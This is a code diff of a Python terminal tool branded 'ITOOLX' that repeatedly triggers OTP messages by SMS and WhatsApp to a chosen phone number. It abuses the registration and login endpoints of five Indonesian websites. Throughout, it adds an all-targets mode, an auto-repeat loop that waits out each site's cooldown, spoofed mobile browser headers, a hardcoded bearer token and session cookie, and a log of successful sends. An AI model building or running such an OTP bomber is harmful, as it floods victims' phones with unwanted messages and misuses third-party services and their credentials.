@@ -13,134 +13,133 @@ try:
     from rich.panel import Panel
     from rich.table import Table
     from rich.prompt import Prompt, IntPrompt
-    from rich.progress import (Progress, SpinnerColumn, BarColumn,
-                               TextColumn, TimeRemainingColumn)
     from rich.align import Align
     from rich.live import Live
+    from rich.columns import Columns
     from rich.text import Text
     from rich import box
     from rich.rule import Rule
+    from rich.layout import Layout
 except ImportError:
     os.system("pip install rich -q")
     from rich.console import Console
     from rich.panel import Panel
     from rich.table import Table
     from rich.prompt import Prompt, IntPrompt
-    from rich.progress import (Progress, SpinnerColumn, BarColumn,
-                               TextColumn, TimeRemainingColumn)
     from rich.align import Align
     from rich.live import Live
+    from rich.columns import Columns
     from rich.text import Text
     from rich import box
     from rich.rule import Rule
+    from rich.layout import Layout
 
 console = Console()
 
 # ══════════════════════════════════════════════════════
-#  STATE
+#  GLOBAL STATE
 # ══════════════════════════════════════════════════════
-# { phone: { method_key: float(sent_at) } }
-cooldown_tracker: dict = {}
-
-# [ { no, time, phone, api, icon, status, preview } ]
-success_log: list = []
-_log_no = [0]   # mutable counter
+cooldown_tracker: dict = {}   # { phone: { method: sent_at } }
+success_log: list      = []   # list of result dicts (all successes)
+_log_no                = [0]
 
 # ══════════════════════════════════════════════════════
-#  API CONFIGS
+#  CONFIG
 # ══════════════════════════════════════════════════════
 APIS = {
-    1: {"name": "Bunda.co.id",        "desc": "OTP via SMS",          "icon": "📱",
+    1: {"name": "Bunda.co.id",        "desc": "SMS",       "icon": "📱",
         "cooldown": 120, "color": "bright_magenta", "method": "bunda"},
-    2: {"name": "OptikMelawai",        "desc": "OTP via Register SMS", "icon": "👓",
+    2: {"name": "OptikMelawai",        "desc": "SMS Reg",   "icon": "👓",
         "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
-    3: {"name": "Paper.id (SMS)",      "desc": "OTP via SMS",          "icon": "📄",
+    3: {"name": "Paper.id SMS",        "desc": "SMS",       "icon": "📄",
         "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
-    4: {"name": "Paper.id (WhatsApp)", "desc": "OTP via WhatsApp",     "icon": "💬",
+    4: {"name": "Paper.id WA",         "desc": "WhatsApp",  "icon": "💬",
         "cooldown": 30,  "color": "bright_yellow",  "method": "paper_wa"},
-    5: {"name": "PlanetBan",           "desc": "OTP via WhatsApp",     "icon": "🏪",
+    5: {"name": "PlanetBan",           "desc": "WhatsApp",  "icon": "🏪",
         "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
-    6: {"name": "ALL TARGETS",         "desc": "Kirim ke semua API",   "icon": "⚡",
+    6: {"name": "ALL TARGETS",         "desc": "Semua API", "icon": "⚡",
         "cooldown": 120, "color": "bold cyan",      "method": "all"},
 }
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36")
 
-BANNER = """[bold cyan]
- ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
+BANNER = """\
+[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
  ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
  ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
- ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
-[/bold cyan]"""
+ ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/bold cyan]"""
 
 # ══════════════════════════════════════════════════════
 #  COOLDOWN HELPERS
 # ══════════════════════════════════════════════════════
 
-def get_remaining(phone: str, method: str, cooldown: int) -> int:
+def get_rem(phone: str, method: str, cd: int) -> int:
     sent = cooldown_tracker.get(phone, {}).get(method)
-    if sent is None:
-        return 0
-    return max(0, int(cooldown - (time.time() - sent)))
+    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))
 
-def set_cooldown(phone: str, method: str):
+def set_cd(phone: str, method: str):
     cooldown_tracker.setdefault(phone, {})[method] = time.time()
 
-def fmt_secs(s: int) -> str:
+def fmt(s: int) -> str:
     m, sc = divmod(s, 60)
-    return f"{m}m {sc:02d}s" if m else f"{sc}s"
+    return f"{m}m{sc:02d}s" if m else f"{sc}s"
 
-def bar_str(rem: int, total: int, width: int = 14) -> str:
-    """Return a simple ASCII progress bar string."""
+def bar(rem: int, total: int, w: int = 16) -> str:
     if total == 0:
-        return "█" * width
-    filled = int((total - rem) / total * width)
-    return "█" * filled + "░" * (width - filled)
+        return "█" * w
+    filled = max(0, int((total - rem) / total * w))
+    return "█" * filled + "░" * (w - filled)
+
+def is_ok(code: int) -> bool:
+    return code in (200, 201, 202)
 
 # ══════════════════════════════════════════════════════
-#  SUCCESS LOG HELPERS
+#  SUCCESS LOG
 # ══════════════════════════════════════════════════════
 
-def log_success(phone: str, api_name: str, icon: str,
-                status: int, body: str):
+def log_ok(phone: str, api: dict, code: int, body: str):
     _log_no[0] += 1
     success_log.append({
-        "no":      _log_no[0],
-        "time":    datetime.now().strftime("%H:%M:%S"),
-        "date":    datetime.now().strftime("%d/%m"),
-        "phone":   phone,
-        "api":     api_name,
-        "icon":    icon,
-        "status":  status,
-        "preview": (body[:80].replace("\n", " ") +
-                    ("…" if len(body) > 80 else "")),
+        "no":    _log_no[0],
+        "ts":    datetime.now().strftime("%H:%M:%S"),
+        "date":  datetime.now().strftime("%d/%m"),
+        "phone": phone,
+        "name":  api["name"],
+        "icon":  api["icon"],
+        "code":  code,
+        "prev":  body[:70].replace("\n", " ") + ("…" if len(body) > 70 else ""),
     })
-
-def is_success(code: int) -> bool:
-    return code in (200, 201, 202)
 
 # ══════════════════════════════════════════════════════
 #  API FUNCTIONS
 # ══════════════════════════════════════════════════════
+
+def _hdr(**extra):
+    h = {
+        "User-Agent": UA,
+        "Accept": "application/json, text/plain, */*",
+        "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
+        "sec-ch-ua-platform": '"Android"',
+        "sec-ch-ua-mobile": "?1",
+        "accept-language": "id-ID,id;q=0.9",
+    }
+    h.update(extra)
+    return h
 
 def send_bunda(phone: str) -> dict:
     try:
         r = requests.post(
             "https://cms.bunda.co.id/api/v1/auth/send-otp",
             data=json.dumps({"phone_number": int(phone), "type": "auth"}),
-            headers={
-                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
+            headers=_hdr(**{
                 "Content-Type": "application/json", "x-locale": "id",
-                "sec-ch-ua-platform": '"Android"', "sec-ch-ua-mobile": "?1",
                 "origin": "https://www.bunda.co.id",
                 "x-requested-with": "com.chimbori.hermitcrab",
                 "referer": "https://www.bunda.co.id/id/hospitals",
-                "accept-language": "id-ID,id;q=0.9",
-                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
-            }, timeout=15)
+            }), timeout=15)
         return {"status": r.status_code, "body": r.text}
     except Exception as e:
         return {"status": 0, "body": str(e)}
@@ -152,18 +151,15 @@ def send_optik(phone: str) -> dict:
             files=[("name",(None,"Jonuis Dane")),("sex",(None,"1")),
                    ("birth_date",(None,"1995-07-28")),("mobile_number",(None,phone)),
                    ("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))],
-            headers={
-                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
-                "language": "id", "sec-ch-ua-platform": '"Android"',
+            headers=_hdr(**{
+                "language": "id",
                 "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
                 "x-unique-user": "GA1.1.883509241.1785170487",
-                "sec-ch-ua-mobile": "?1", "origin": "https://optikmelawai.com",
+                "origin": "https://optikmelawai.com",
                 "x-requested-with": "com.chimbori.hermitcrab",
                 "referer": "https://optikmelawai.com/",
-                "accept-language": "id-ID,id;q=0.9",
                 "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
-                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
-            }, timeout=15)
+            }), timeout=15)
         return {"status": r.status_code, "body": r.text}
     except Exception as e:
         return {"status": 0, "body": str(e)}
@@ -174,15 +170,13 @@ def send_paper(phone: str, method: str = "sms") -> dict:
             "https://register.paper.id/api/v1/auth/register/send-otp",
             data=json.dumps({"phone": phone, "method": method,
                              "registered_by": "flutter mweb"}),
-            headers={
-                "User-Agent": UA, "Content-Type": "application/json",
-                "sec-ch-ua-platform": '"Android"', "authorization": "",
+            headers=_hdr(**{
+                "Content-Type": "application/json", "authorization": "",
                 "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
-                "sec-ch-ua-mobile": "?1", "origin": "https://paper.id",
+                "origin": "https://paper.id",
                 "x-requested-with": "com.chimbori.hermitcrab",
-                "referer": "https://paper.id/", "accept-language": "id-ID,id;q=0.9",
-                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
-            }, timeout=15)
+                "referer": "https://paper.id/",
+            }), timeout=15)
         return {"status": r.status_code, "body": r.text}
     except Exception as e:
         return {"status": 0, "body": str(e)}
@@ -193,18 +187,13 @@ def send_planetban(phone: str) -> dict:
     try:
         r = requests.post(
             "https://api.planetban.com/website/customer/request-otp",
-            data=json.dumps({"phone": pb, "purpose": "register",
-                             "method": "whatsapp"}),
-            headers={
-                "User-Agent": UA, "Accept": "application/json, text/plain, */*",
+            data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
+            headers=_hdr(**{
                 "Content-Type": "application/json",
-                "sec-ch-ua-platform": '"Android"', "sec-ch-ua-mobile": "?1",
                 "origin": "https://planetban.com",
                 "x-requested-with": "com.chimbori.hermitcrab",
                 "referer": "https://planetban.com/",
-                "accept-language": "id-ID,id;q=0.9",
-                "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
-            }, timeout=15)
+            }), timeout=15)
         return {"status": r.status_code, "body": r.text}
     except Exception as e:
         return {"status": 0, "body": str(e)}
@@ -218,19 +207,331 @@ def dispatch(method: str, phone: str) -> dict:
     return {}
 
 # ══════════════════════════════════════════════════════
-#  UI HELPERS
+#  RENDERERS — semua return Rich renderable
 # ══════════════════════════════════════════════════════
 
-def status_color(code: int) -> str:
-    if code in (200, 201, 202): return "bold green"
-    if code == 0:               return "bold red"
-    if code >= 400:             return "bold red"
-    return "bold yellow"
+def render_banner() -> Panel:
+    return Panel(BANNER, border_style="cyan", padding=(0, 1))
 
-def result_icon(code: int) -> str:
-    if code in (200, 201, 202): return "✅"
-    if code == 0:               return "❌"
-    return "⚠️"
+
+def render_menu(phone: str = "") -> Table:
+    t = Table(
+        title=(
+            f"[bold cyan]⚡ PILIH TARGET[/bold cyan]"
+            + (f"  [dim]→ [bright_yellow]{phone}[/bright_yellow][/dim]" if phone else "")
+        ),
+        box=box.DOUBLE_EDGE, border_style="cyan",
+        header_style="bold cyan", show_lines=True,
+    )
+    t.add_column("No",  width=4,  justify="center", style="bold white")
+    t.add_column("",    width=3,  justify="center")
+    t.add_column("API", width=18, style="bold")
+    t.add_column("Via", width=10)
+    t.add_column("CD",  width=9,  justify="center")
+
+    for num, api in APIS.items():
+        if phone and api["method"] != "all":
+            rem    = get_rem(phone, api["method"], api["cooldown"])
+            cd_txt = (f"[bold red]{fmt(rem)}[/bold red]"
+                      if rem > 0 else
+                      f"[bold green]{api['cooldown']}s[/bold green]")
+        else:
+            cd_txt = f"[dim]{api['cooldown']}s[/dim]"
+
+        t.add_row(
+            f"[cyan]{num}[/cyan]",
+            api["icon"],
+            f"[{api['color']}]{api['name']}[/{api['color']}]",
+            f"[dim]{api['desc']}[/dim]",
+            cd_txt,
+        )
+    t.add_row("[red]0[/red]", "🚪", "[red]EXIT[/red]", "[dim]Keluar[/dim]", "-")
+    return t
+
+
+def render_history(n: int = 5) -> Table:
+    """Last-n success log as a compact table."""
+    recent = success_log[-n:][::-1]
+    t = Table(
+        title=f"[bold green]✅ HISTORY SUKSES  ({len(success_log)} total)[/bold green]",
+        box=box.SIMPLE_HEAVY, border_style="green",
+        header_style="bold green", show_lines=False,
+    )
+    t.add_column("#",    width=4,  justify="right", style="dim")
+    t.add_column("Jam",  width=9,  style="dim")
+    t.add_column("Nomor",width=15, style="bold bright_yellow")
+    t.add_column("API",  width=18)
+    t.add_column("HTTP", width=5,  justify="center")
+
+    if not recent:
+        t.add_row("[dim]-[/dim]", "[dim]Belum ada[/dim]", "", "", "")
+    for e in recent:
+        t.add_row(
+            str(e["no"]), e["ts"], e["phone"],
+            f"{e['icon']} {e['name']}",
+            f"[bold green]{e['code']}[/bold green]",
+        )
+    return t
+
+
+def render_cd_table(phone: str, targets: list) -> Table:
+    """Per-API cooldown bar table for a given phone."""
+    t = Table(
+        box=box.SIMPLE_HEAVY, border_style="yellow",
+        show_header=False, show_lines=False, padding=(0, 1),
+    )
+    t.add_column("", width=3,  justify="center")
+    t.add_column("", width=18)
+    t.add_column("", width=18)
+    t.add_column("", width=9,  justify="right")
+    t.add_column("", width=10, justify="center")
+
+    for api in targets:
+        if api["method"] == "all":
+            continue
+        rem  = get_rem(phone, api["method"], api["cooldown"])
+        sent = cooldown_tracker.get(phone, {}).get(api["method"])
+        if rem > 0 and sent:
+            b      = bar(rem, api["cooldown"], 16)
+            filled = api["cooldown"] - rem
+            b_str  = (f"[bold cyan]{'█' * int(filled/api['cooldown']*16)}[/bold cyan]"
+                      f"[dim]{'░' * (16 - int(filled/api['cooldown']*16))}[/dim]")
+            sisa   = f"[bold red]{fmt(rem)}[/bold red]"
+            unlock = datetime.fromtimestamp(sent + api["cooldown"]).strftime("%H:%M:%S")
+            status = "[red]🔒[/red]"
+        else:
+            b_str  = f"[bold green]{'█' * 16}[/bold green]"
+            sisa   = "[bold green]READY[/bold green]"
+            unlock = "[dim]-[/dim]"
+            status = "[green]🔓[/green]"
+
+        t.add_row(
+            status,
+            f"[{api['color']}]{api['icon']} {api['name']}[/{api['color']}]",
+            b_str, sisa, f"[dim]{unlock}[/dim]",
+        )
+    return t
+
+# ══════════════════════════════════════════════════════
+#  LIVE COOLDOWN WAIT  — blokir sampai CD selesai,
+#  refresh tiap detik, lalu tanya Y / R / N
+# ══════════════════════════════════════════════════════
+
+def wait_cooldown_live(phone: str, targets: list) -> str:
+    """
+    Tampilkan live countdown sampai semua target READY,
+    lalu tanya user: Y = kirim sekali, R = auto-repeat, N = stop.
+    Return: 'y' | 'r' | 'n'
+    """
+    def need_wait() -> int:
+        return max(
+            (get_rem(phone, a["method"], a["cooldown"]) for a in targets
+             if a["method"] != "all"),
+            default=0,
+        )
+
+    if need_wait() > 0:
+        def make_live_panel() -> Panel:
+            rows = render_cd_table(phone, targets)
+            rem  = need_wait()
+            caption = (
+                f"[bold yellow]⏳ Menunggu cooldown...  Sisa terlama: "
+                f"[bold red]{fmt(rem)}[/bold red][/bold yellow]"
+                if rem > 0 else
+                "[bold green]🔓 Semua READY![/bold green]"
+            )
+            return Panel(
+                rows,
+                title=f"[bold yellow]⏱  COOLDOWN  →  {phone}[/bold yellow]",
+                subtitle=caption,
+                border_style="yellow",
+                padding=(0, 1),
+            )
+
+        console.print()
+        try:
+            with Live(make_live_panel(), console=console,
+                      refresh_per_second=1, transient=True) as live:
+                while need_wait() > 0:
+                    time.sleep(1)
+                    live.update(make_live_panel())
+        except KeyboardInterrupt:
+            console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")
+            return "n"
+
+    # ── Prompt setelah semua READY ────────────────────────────────
+    console.print()
+    console.print(Panel(
+        "[bold green]🔓 COOLDOWN SELESAI![/bold green]\n\n"
+        "  [bold cyan]Y[/bold cyan]  →  Kirim [bold]sekali[/bold] lagi\n"
+        "  [bold cyan]R[/bold cyan]  →  [bold]Auto-repeat[/bold] (terus kirim & tunggu CD otomatis)\n"
+        "  [bold cyan]N[/bold cyan]  →  [bold]Stop[/bold], kembali ke menu",
+        border_style="green", padding=(1, 2),
+    ))
+    try:
+        choice = Prompt.ask(
+            "[bold cyan]  ❯[/bold cyan] Pilihan",
+            choices=["y", "r", "n", "Y", "R", "N"],
+            default="y",
+        ).lower()
+    except (KeyboardInterrupt, EOFError):
+        return "n"
+    return choice
+
+# ══════════════════════════════════════════════════════
+#  RESULT PANEL
+# ══════════════════════════════════════════════════════
+
+def show_result(api: dict, phone: str, res: dict, round_n: int = 1):
+    code  = res.get("status", 0)
+    body  = res.get("body", "")
+    prev  = body[:90].replace("\n", " ") + ("…" if len(body) > 90 else "")
+    ok    = is_ok(code)
+    color = "bold green" if ok else ("bold red" if code == 0 else "bold red")
+    icon  = "✅" if ok else "⚠️"
+
+    if ok:
+        log_ok(phone, api, code, body)
+        badge = "  [bold green]✅ +1 History Sukses[/bold green]"
+    else:
+        badge = ""
+
+    console.print(Panel(
+        f"[bold white]API      :[/bold white] {api['icon']} [{api['color']}]{api['name']}[/{api['color']}]\n"
+        f"[bold white]Nomor    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
+        f"[bold white]Round    :[/bold white] [white]{round_n}[/white]\n"
+        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
+        f"[bold white]Waktu    :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
+        f"[bold white]Response :[/bold white] [dim]{prev}[/dim]"
+        + badge,
+        title=f"[bold]{icon} RESULT[/bold]",
+        border_style="green" if ok else "red",
+        padding=(1, 2),
+    ))
+
+
+def show_all_results(phone: str, results: list, round_n: int):
+    t = Table(
+        title=f"[bold cyan]⚡ ALL TARGETS  Round {round_n}[/bold cyan]",
+        box=box.ROUNDED, border_style="cyan",
+        header_style="bold cyan", show_lines=True,
+    )
+    t.add_column("",      width=3,  justify="center")
+    t.add_column("API",   width=20)
+    t.add_column("HTTP",  width=6,  justify="center")
+    t.add_column("Status",width=10)
+    t.add_column("Jam",   width=9)
+    for item in results:
+        code = item["status"]
+        ok   = is_ok(code)
+        col  = "bold green" if ok else "bold red"
+        stxt = "SUCCESS" if ok else "FAILED"
+        t.add_row(
+            item["icon"], f"[bold]{item['name']}[/bold]",
+            f"[{col}]{code}[/{col}]",
+            f"[{col}]{stxt}[/{col}]",
+            f"[dim]{item['time']}[/dim]",
+        )
+    console.print(Align.center(t))
+
+# ══════════════════════════════════════════════════════
+#  SEND SESSION — single target
+# ══════════════════════════════════════════════════════
+
+def session_single(api: dict, phone: str):
+    """Kirim + loop Y/R/N tanpa kembali ke menu sampai user pilih N."""
+    round_n = 0
+    mode    = "y"   # first run langsung kirim
+
+    while True:
+        if mode == "r" and round_n > 0:
+            # auto-repeat: tunggu CD lalu kirim
+            ans = wait_cooldown_live(phone, [api])
+            if ans == "n":
+                break
+            if ans == "y":
+                mode = "y"
+            # else stays 'r'
+
+        elif round_n > 0:
+            # setelah kirim pertama, tanya Y/R/N
+            ans = wait_cooldown_live(phone, [api])
+            if ans == "n":
+                break
+            mode = ans
+
+        # ── Kirim ──────────────────────────────────────────────────
+        round_n += 1
+        console.print(Rule(f"[bold cyan] ▶  Round {round_n} [/bold cyan]"))
+        with console.status(
+            f"[bold cyan]Mengirim → [bright_yellow]{api['name']}[/bright_yellow]...",
+            spinner="dots",
+        ):
+            res = dispatch(api["method"], phone)
+        set_cd(phone, api["method"])
+        show_result(api, phone, res, round_n)
+
+        # Setelah kirim, langsung tampil mini history
+        console.print(Align.center(render_history(3)))
+        console.print()
+
+        if mode != "r":
+            # bukan auto-repeat → tunggu & tanya manual
+            ans = wait_cooldown_live(phone, [api])
+            if ans == "n":
+                break
+            mode = ans
+
+# ══════════════════════════════════════════════════════
+#  SEND SESSION — ALL targets
+# ══════════════════════════════════════════════════════
+
+def session_all(phone: str):
+    targets = [v for v in APIS.values() if v["method"] != "all"]
+    round_n = 0
+    mode    = "y"
+
+    while True:
+        if round_n > 0:
+            ans = wait_cooldown_live(phone, targets)
+            if ans == "n":
+                break
+            mode = ans
+
+        round_n += 1
+        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS  Round {round_n} [/bold cyan]"))
+
+        results = []
+        for api in targets:
+            with console.status(
+                f"[bold cyan]→ [bright_yellow]{api['name']}[/bright_yellow]...",
+                spinner="aesthetic",
+            ):
+                t   = datetime.now().strftime("%H:%M:%S")
+                res = dispatch(api["method"], phone)
+                set_cd(phone, api["method"])
+                if is_ok(res.get("status", 0)):
+                    log_ok(phone, api, res["status"], res.get("body", ""))
+                results.append({
+                    "name": api["name"], "icon": api["icon"],
+                    "status": res.get("status", 0),
+                    "body": res.get("body", ""), "time": t,
+                })
+            time.sleep(0.2)
+
+        show_all_results(phone, results, round_n)
+        console.print(Align.center(render_history(3)))
+        console.print()
+
+        if mode != "r":
+            ans = wait_cooldown_live(phone, targets)
+            if ans == "n":
+                break
+            mode = ans
+
+# ══════════════════════════════════════════════════════
+#  HELPERS
+# ══════════════════════════════════════════════════════
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
@@ -242,409 +543,12 @@ def validate_phone(raw: str) -> str:
     if p.startswith("8"):   return "62" + p
     return p
 
-def print_banner():
-    console.print(BANNER)
-    console.print(Align.center(Panel(
-        "[bold white]Multi-API OTP Sender Tools[/bold white]\n"
-        "[dim]by [bold cyan]ITOOLX[/bold cyan] · Termux Edition[/dim]",
-        border_style="cyan", padding=(0, 4),
-    )))
-    console.print()
-
-# ══════════════════════════════════════════════════════
-#  MAIN MENU
-# ══════════════════════════════════════════════════════
-
-def print_menu(phone: str = ""):
-    table = Table(
-        title="[bold cyan]⚡ PILIH TARGET API ⚡[/bold cyan]",
-        box=box.DOUBLE_EDGE, border_style="cyan",
-        header_style="bold cyan", show_lines=True, min_width=52,
-    )
-    table.add_column("No",     style="bold white", justify="center", width=4)
-    table.add_column("",       justify="center",   width=3)
-    table.add_column("Target", style="bold",        width=22)
-    table.add_column("Mode",   width=22)
-    table.add_column("CD",     justify="center",    width=9)
-
-    for num, api in APIS.items():
-        if phone and api["method"] != "all":
-            rem = get_remaining(phone, api["method"], api["cooldown"])
-            cd_txt = (f"[bold red]{fmt_secs(rem)}[/bold red]"
-                      if rem > 0
-                      else f"[bold yellow]{api['cooldown']}s[/bold yellow]")
-        else:
-            cd_txt = f"[bold yellow]{api['cooldown']}s[/bold yellow]"
-
-        table.add_row(
-            f"[bold cyan]{num}[/bold cyan]",
-            api["icon"],
-            f"[{api['color']}]{api['name']}[/{api['color']}]",
-            f"[dim]{api['desc']}[/dim]",
-            cd_txt,
-        )
-
-    table.add_row("[bold green]7[/bold green]", "📊",
-                  "[bold green]History Sukses[/bold green]",
-                  f"[dim]{len(success_log)} item tersimpan[/dim]", "-")
-    table.add_row("[bold yellow]8[/bold yellow]", "⏱",
-                  "[bold yellow]Live Cooldown[/bold yellow]",
-                  "[dim]Realtime hitung mundur[/dim]", "-")
-    table.add_row("[bold red]0[/bold red]", "🚪",
-                  "[bold red]EXIT[/bold red]",
-                  "[dim]Keluar dari program[/dim]", "-")
-
-    console.print(Align.center(table))
-    if phone:
-        console.print(Align.center(
-            f"[dim]Nomor aktif → [bold bright_yellow]{phone}[/bold bright_yellow][/dim]"
-        ))
-    console.print()
-
-# ══════════════════════════════════════════════════════
-#  LIVE COOLDOWN VIEW  (realtime, refresh per detik)
-# ══════════════════════════════════════════════════════
-
-def _build_live_cd_table() -> Table:
-    """Build the live-updating cooldown table."""
-    now = datetime.now().strftime("%H:%M:%S")
-    table = Table(
-        title=f"[bold cyan]⏱  REALTIME COOLDOWN  [/bold cyan][dim]({now})[/dim]",
-        box=box.ROUNDED, border_style="cyan",
-        header_style="bold cyan", show_lines=True,
-    )
-    table.add_column("Nomor",        width=16, style="bright_yellow")
-    table.add_column("API",          width=22)
-    table.add_column("Progress",     width=18)
-    table.add_column("Sisa",         width=9, justify="right")
-    table.add_column("Unlock",       width=10, justify="center")
-    table.add_column("Status",       width=12, justify="center")
-
-    if not cooldown_tracker:
-        table.add_row(
-            "[dim]─[/dim]", "[dim]Belum ada data cooldown[/dim]",
-            "", "", "", "",
-        )
-        return table
-
-    for phone, methods in cooldown_tracker.items():
-        first = True
-        for api in APIS.values():
-            if api["method"] == "all":
-                continue
-            method = api["method"]
-            if method not in methods:
-                continue
-
-            rem   = get_remaining(phone, method, api["cooldown"])
-            total = api["cooldown"]
-            sent  = methods[method]
-
-            # progress bar visual
-            if rem > 0:
-                filled  = int((total - rem) / total * 14)
-                bar_vis = (
-                    f"[bold cyan]{'█' * filled}[/bold cyan]"
-                    f"[dim]{'░' * (14 - filled)}[/dim]"
-                )
-                sisa_txt   = f"[bold red]{fmt_secs(rem)}[/bold red]"
-                unlock_txt = datetime.fromtimestamp(
-                    sent + total).strftime("%H:%M:%S")
-                stat_txt   = "[bold red]🔒 LOCKED[/bold red]"
-            else:
-                bar_vis    = f"[bold green]{'█' * 14}[/bold green]"
-                sisa_txt   = "[bold green]-[/bold green]"
-                unlock_txt = "[dim]-[/dim]"
-                stat_txt   = "[bold green]🔓 READY[/bold green]"
-
-            phone_cell = (
-                f"[bright_yellow]{phone}[/bright_yellow]" if first else ""
-            )
-            table.add_row(
-                phone_cell,
-                f"{api['icon']} [{api['color']}]{api['name']}[/{api['color']}]",
-                bar_vis,
-                sisa_txt,
-                unlock_txt,
-                stat_txt,
-            )
-            first = False
-
-    return table
-
-
-def view_live_cooldown():
-    """Full-screen live cooldown panel, Ctrl+C / Enter to exit."""
-    clear()
-    console.print(BANNER)
-    console.print(Align.center(
-        "[dim]Tekan [bold]Ctrl+C[/bold] atau [bold]Enter[/bold] untuk kembali ke menu[/dim]\n"
-    ))
-
-    # We run live refresh in a background-style loop using Live
-    try:
-        with Live(
-            _build_live_cd_table(),
-            console=console,
-            refresh_per_second=1,
-            screen=False,
-        ) as live:
-            while True:
-                time.sleep(1)
-                live.update(_build_live_cd_table())
-    except KeyboardInterrupt:
-        pass
-
-# ══════════════════════════════════════════════════════
-#  SUCCESS LOG VIEW
-# ══════════════════════════════════════════════════════
-
-def view_success_log():
-    clear()
-    console.print(BANNER)
-
-    if not success_log:
-        console.print(Align.center(Panel(
-            "[bold yellow]📭  Belum ada pengiriman sukses.[/bold yellow]",
-            border_style="yellow", padding=(1, 4),
-        )))
-        console.print()
-        Prompt.ask("[bold cyan]  ❯[/bold cyan] Enter untuk kembali", default="")
-        return
-
-    table = Table(
-        title=f"[bold green]📊 HISTORY SUKSES  ({len(success_log)} item)[/bold green]",
-        box=box.ROUNDED, border_style="green",
-        header_style="bold green", show_lines=True,
-    )
-    table.add_column("#",       width=4,  justify="right",  style="bold white")
-    table.add_column("Tgl",     width=6,  justify="center", style="dim")
-    table.add_column("Jam",     width=9,  justify="center", style="dim")
-    table.add_column("Nomor",   width=15, style="bold bright_yellow")
-    table.add_column("API",     width=22)
-    table.add_column("HTTP",    width=6,  justify="center")
-    table.add_column("Preview", width=34, style="dim")
-
-    for entry in reversed(success_log):   # terbaru di atas
-        code  = entry["status"]
-        color = status_color(code)
-        table.add_row(
-            str(entry["no"]),
-            entry["date"],
-            entry["time"],
-            entry["phone"],
-            f"{entry['icon']} {entry['api']}",
-            f"[{color}]{code}[/{color}]",
-            entry["preview"],
-        )
-
-    console.print(Align.center(table))
-    console.print()
-
-    # Summary box
-    total   = len(success_log)
-    phones  = len({e["phone"] for e in success_log})
-    apis    = len({e["api"] for e in success_log})
-    console.print(Align.center(Panel(
-        f"[bold white]Total sukses :[/bold white] [bold green]{total}[/bold green]   "
-        f"[bold white]Nomor unik :[/bold white] [bold yellow]{phones}[/bold yellow]   "
-        f"[bold white]API dipakai:[/bold white] [bold cyan]{apis}[/bold cyan]",
-        border_style="green", padding=(0, 2),
-    )))
-    console.print()
-    Prompt.ask("[bold cyan]  ❯[/bold cyan] Enter untuk kembali", default="")
-
-# ══════════════════════════════════════════════════════
-#  COUNTDOWN BAR  (blocking, saat tunggu cooldown)
-# ══════════════════════════════════════════════════════
-
-def countdown(seconds: int, label: str = "Cooldown"):
-    with Progress(
-        SpinnerColumn(spinner_name="dots", style="bold cyan"),
-        TextColumn(f"[bold yellow]{label}"),
-        BarColumn(bar_width=26, style="cyan", complete_style="bright_cyan"),
-        TextColumn("[bold white]{task.percentage:>3.0f}%"),
-        TimeRemainingColumn(),
-        console=console, transient=True,
-    ) as prog:
-        task = prog.add_task("", total=seconds)
-        for _ in range(seconds):
-            time.sleep(1)
-            prog.advance(task, 1)
-
-# ══════════════════════════════════════════════════════
-#  RESULT PANELS
-# ══════════════════════════════════════════════════════
-
-def print_result_panel(api_cfg: dict, phone: str, result: dict,
-                       loop: int, total: int):
-    code    = result.get("status", 0)
-    body    = result.get("body", "")
-    icon    = result_icon(code)
-    color   = status_color(code)
-    preview = body[:100].replace("\n", " ") + ("…" if len(body) > 100 else "")
-
-    if is_success(code):
-        log_success(phone, api_cfg["name"], api_cfg["icon"], code, body)
-        extra = "[bold green]  ✅ Disimpan ke History Sukses[/bold green]"
-    else:
-        extra = ""
-
-    console.print(Panel(
-        f"[bold white]Target   :[/bold white] [cyan]{api_cfg['name']}[/cyan]\n"
-        f"[bold white]Phone    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
-        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
-        f"[bold white]Round    :[/bold white] [white]{loop}/{total}[/white]\n"
-        f"[bold white]Time     :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
-        f"[bold white]Response :[/bold white] [dim]{preview}[/dim]"
-        + (f"\n{extra}" if extra else ""),
